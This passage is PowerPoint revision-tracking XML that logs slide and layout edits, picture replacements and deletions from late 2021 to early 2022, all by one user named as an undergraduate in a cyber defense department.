          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:37:23.015" v="926"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="421932750" sldId="355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7:39.882" v="936"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="421932750" sldId="355"/>
            <ac:spMk id="3" creationId="{BD33F9B7-6FA1-40A1-8E29-435855FB5B4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38:13.174" v="1056"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2087600335" sldId="356"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:37:51.196" v="964"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2087600335" sldId="356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38:13.174" v="1056"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2087600335" sldId="356"/>
            <ac:spMk id="3" creationId="{BD33F9B7-6FA1-40A1-8E29-435855FB5B4E}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:42:53.745" v="1345" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3768780291" sldId="357"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:42:10.964" v="1061"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3768780291" sldId="357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2:53.745" v="1345" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3768780291" sldId="357"/>
            <ac:spMk id="3" creationId="{BD33F9B7-6FA1-40A1-8E29-435855FB5B4E}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:43:25.300" v="1401" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="281315117" sldId="358"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:43:03.149" v="1346"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="281315117" sldId="358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3:14.258" v="1396"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="281315117" sldId="358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43:25.300" v="1401" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="281315117" sldId="358"/>
            <ac:picMk id="6" creationId="{7498F5E0-E299-4802-A52D-424D780523B4}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:44:12.618" v="1604" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="657699335" sldId="359"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:43:37.352" v="1429"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="657699335" sldId="359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4:07.677" v="1602" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="657699335" sldId="359"/>
            <ac:spMk id="3" creationId="{BD33F9B7-6FA1-40A1-8E29-435855FB5B4E}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:44:12.618" v="1604" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="657699335" sldId="359"/>
            <ac:picMk id="6" creationId="{DD28D1AA-51B6-49C4-97E3-CC3C96323F88}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:45:14.143" v="1840" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2888858680" sldId="360"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:44:31.084" v="1623"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2888858680" sldId="360"/>
            <ac:spMk id="2" creationId="{87D5444C-9F9F-474D-8588-7A4C40591F8D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5:14.143" v="1840" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2888858680" sldId="360"/>
            <ac:spMk id="3" creationId="{BD33F9B7-6FA1-40A1-8E29-435855FB5B4E}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:45:47.403" v="1866" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1149798840" sldId="361"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:45:34.388" v="1863"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1149798840" sldId="361"/>
            <ac:spMk id="2" creationId="{F6538573-C45A-4D3C-93F0-9580E3004734}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:45:41.287" v="1864" actId="22"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1149798840" sldId="361"/>
            <ac:spMk id="3" creationId="{A78A2427-7B32-4948-8799-AEB01D72CECA}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod ord">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:45:47.403" v="1866" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1149798840" sldId="361"/>
            <ac:picMk id="6" creationId="{1691150F-CAD5-434C-81FC-5D4B6A35039D}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new del mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:49:08.123" v="1901" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4181078703" sldId="362"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:49:02.699" v="1887"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4181078703" sldId="362"/>
            <ac:spMk id="2" creationId="{42DD2CED-9D83-4C81-9265-F854E88F5726}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:49:06.298" v="1900" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4181078703" sldId="362"/>
            <ac:spMk id="3" creationId="{87CE4227-BB12-49B1-9998-625EF88FABD2}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldMasterChg chg="addSp delSp modSp mod modSldLayout">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:55.227" v="27"/>
        <pc:sldMasterMkLst>
          <pc:docMk/>
          <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
        </pc:sldMasterMkLst>
        <pc:picChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:53:48.864" v="1" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <ac:picMk id="13" creationId="{29BA69F9-0503-4067-AB7A-E231C86B3305}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:35.209" v="19" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <ac:picMk id="1026" creationId="{1EF39420-1696-4E54-87DF-79AD7DE80951}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:sldLayoutChg chg="addSp delSp modSp mod">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:45.329" v="20"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="546768808" sldId="2147483673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45.329" v="20"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
              <ac:picMk id="11" creationId="{DAA0D7A3-6928-4C01-A482-7794986FF1A5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46.469" v="0" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
              <ac:picMk id="14" creationId="{11C0864E-6448-44E1-AFE5-2E08773EEE8A}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="modSp mod">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:55:42.177" v="16" actId="1076"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2099084053" sldId="2147483674"/>
          </pc:sldLayoutMkLst>
          <pc:spChg chg="mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:55:42.177" v="16" actId="1076"/>
            <ac:spMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2099084053" sldId="2147483674"/>
              <ac:spMk id="2" creationId="{00000000-0000-0000-0000-000000000000}"/>
            </ac:spMkLst>
          </pc:sp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46.674" v="21"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:53:51.371" v="2" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
              <ac:picMk id="13" creationId="{9E849662-F097-4B69-ABDD-03264CF3CAD9}"/>
            </ac:picMkLst>
          </pc:picChg>
          <pc:picChg chg="add mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:46.674" v="21"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
              <ac:picMk id="14" creationId="{3B7FE58E-2497-4D0D-A840-8D897A307375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49.170" v="22"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:53:54.305" v="3" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
              <ac:picMk id="9" creationId="{1ECB84DA-A8BA-4128-B903-EB68DDB0E6FE}"/>
            </ac:picMkLst>
          </pc:picChg>
          <pc:picChg chg="add mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:49.170" v="22"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
              <ac:picMk id="10" creationId="{98451C86-C339-4FF7-8A13-0B63E9B4F7AF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1.500" v="23"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2831446787" sldId="2147483680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1.500" v="23"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
              <ac:picMk id="11" creationId="{1699C7EA-96C9-421E-9F3C-C664E83A957D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57.010" v="4" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
              <ac:picMk id="13" creationId="{2ADE25BB-E09D-49C2-9D2C-C788645C9972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2.260" v="24"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="366081474" sldId="2147483681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2.260" v="24"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
              <ac:picMk id="10" creationId="{1A4BE99F-4AE2-4BEA-8D48-B1BF3C8FDFFB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3:58.877" v="5" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
              <ac:picMk id="12" creationId="{8DC6B2BE-E411-42DC-A126-E1DD70931A5F}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="addSp delSp modSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:53.800" v="26"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="1505422099" sldId="2147483682"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="add del mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:53.800" v="26"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="1505422099" sldId="2147483682"/>
              <ac:picMk id="7" creationId="{E88D0D0B-959A-467D-936B-FB5192B98804}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="addSp delSp modSp mod">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:55.227" v="27"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="add mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:56:55.227" v="27"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
              <ac:picMk id="10" creationId="{717264EC-A67D-40EC-9C6B-5D0A30610B31}"/>
            </ac:picMkLst>
          </pc:picChg>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T08:54:02.004" v="6" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
              <ac:picMk id="12" creationId="{D6AD4521-2136-4714-9EA2-136D4E7C63AD}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
      </pc:sldMasterChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{6C5DC9A1-9364-42BA-A78B-7C433C3E275D}"/>
    <pc:docChg chg="delSld modSld modSection">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{6C5DC9A1-9364-42BA-A78B-7C433C3E275D}" dt="2022-01-02T20:55:40.433" v="31" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{6C5DC9A1-9364-42BA-A78B-7C433C3E275D}" dt="2022-01-02T20:55:40.433" v="31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6C5DC9A1-9364-42BA-A78B-7C433C3E275D}" dt="2022-01-02T20:55:40.433" v="31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41368066" sldId="26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388057446" sldId="26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98488887" sldId="26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32550847" sldId="26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81593077" sldId="26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3161158" sldId="27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956657893" sldId="27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563383341" sldId="27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11726360" sldId="27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562858279" sldId="27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95893911" sldId="27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31126702" sldId="27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80897034" sldId="27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03984751" sldId="27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42887221" sldId="27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505018846" sldId="28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771646766" sldId="28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746235029" sldId="28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38717978" sldId="28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08929877" sldId="28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98235405" sldId="28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985595965" sldId="28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08145237" sldId="28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879821062" sldId="28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93003946" sldId="28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24154356" sldId="29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272398856" sldId="29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06602799" sldId="29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6278660" sldId="29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60878423" sldId="29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75899499" sldId="29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96816349" sldId="29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045765425" sldId="29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040518841" sldId="29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93450419" sldId="30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82602585" sldId="30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044177403" sldId="30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91863186" sldId="30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735915025" sldId="30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40414345" sldId="30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60324094" sldId="30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37978872" sldId="30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07991251" sldId="30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82123724" sldId="30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682925829" sldId="31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564423949" sldId="31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28712980" sldId="31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150555230" sldId="31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840296087" sldId="31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07939077" sldId="31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416698218" sldId="31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37838211" sldId="31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14188019" sldId="31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617413653" sldId="32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78947117" sldId="32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247097004" sldId="32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79073654" sldId="32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650239397" sldId="32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039382090" sldId="32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8451364" sldId="32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01295334" sldId="32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141664827" sldId="32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02405254" sldId="33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59579555" sldId="33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879814390" sldId="33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417646756" sldId="33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09551197" sldId="33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396147998" sldId="33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065314893" sldId="33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994696824" sldId="33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71482761" sldId="33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31992139" sldId="33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701517021" sldId="34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026576549" sldId="34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582896346" sldId="34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7469201" sldId="34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79546471" sldId="34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515118274" sldId="34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624952614" sldId="34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636908598" sldId="34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24.950" v="29" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="365798377" sldId="34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06261693" sldId="34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19041979" sldId="35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978286067" sldId="351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724742321" sldId="352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863911632" sldId="353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621801038" sldId="354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421932750" sldId="355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087600335" sldId="356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3768780291" sldId="357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1315117" sldId="358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657699335" sldId="359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2888858680" sldId="360"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{6C5DC9A1-9364-42BA-A78B-7C433C3E275D}" dt="2022-01-02T20:55:31.168" v="30" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1149798840" sldId="361"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}"/>
    <pc:docChg chg="addSld delSld modSld modSection">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:39:15.442" v="111"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:26:55.550" v="93" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="608442772" sldId="264"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:26:55.550" v="93" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="608442772" sldId="264"/>
            <ac:spMk id="3" creationId="{0176ED39-4317-4F55-8003-2D3059F91B81}"/>
          </ac:spMkLst>
        </pc:spChg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034056920" sldId="265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53425630" sldId="266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95239833" sldId="267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4263028531" sldId="268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4001799063" sldId="269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270433884" sldId="270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473118542" sldId="271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918281891" sldId="272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405884700" sldId="273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3752081131" sldId="274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416308923" sldId="275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2096836756" sldId="276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010997484" sldId="277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376911049" sldId="278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278129522" sldId="279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208116174" sldId="280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3426803075" sldId="281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3255480629" sldId="282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2952858617" sldId="283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2089165574" sldId="284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515988802" sldId="285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727322894" sldId="286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2750242261" sldId="287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2436073753" sldId="288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3190920715" sldId="289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827701464" sldId="290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931895213" sldId="297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200873872" sldId="299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2623457735" sldId="300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3789238446" sldId="301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3484217596" sldId="302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961400827" sldId="303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802802047" sldId="304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4103593297" sldId="306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600082958" sldId="309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910110180" sldId="310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023045183" sldId="312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2700344814" sldId="313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446908391" sldId="314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385886611" sldId="315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4072963519" sldId="316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2690846427" sldId="317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3626506312" sldId="318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2540040794" sldId="319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53037010" sldId="320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4136927666" sldId="321"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:31:37.454" v="96" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="771979764" sldId="323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3020979585" sldId="324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487602397" sldId="325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3100583483" sldId="326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870789915" sldId="327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878371329" sldId="328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4123585045" sldId="329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2439970183" sldId="330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3978852687" sldId="331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3551912557" sldId="332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2112665782" sldId="333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3261163106" sldId="334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1036660321" sldId="335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4200601166" sldId="360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3432454286" sldId="361"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:31:32.264" v="95"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2147726762" sldId="362"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{DEE7DF64-5B04-4C0E-8383-74EF32D428AE}" dt="2022-01-04T13:39:15.442" v="111"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1270930745" sldId="363"/>
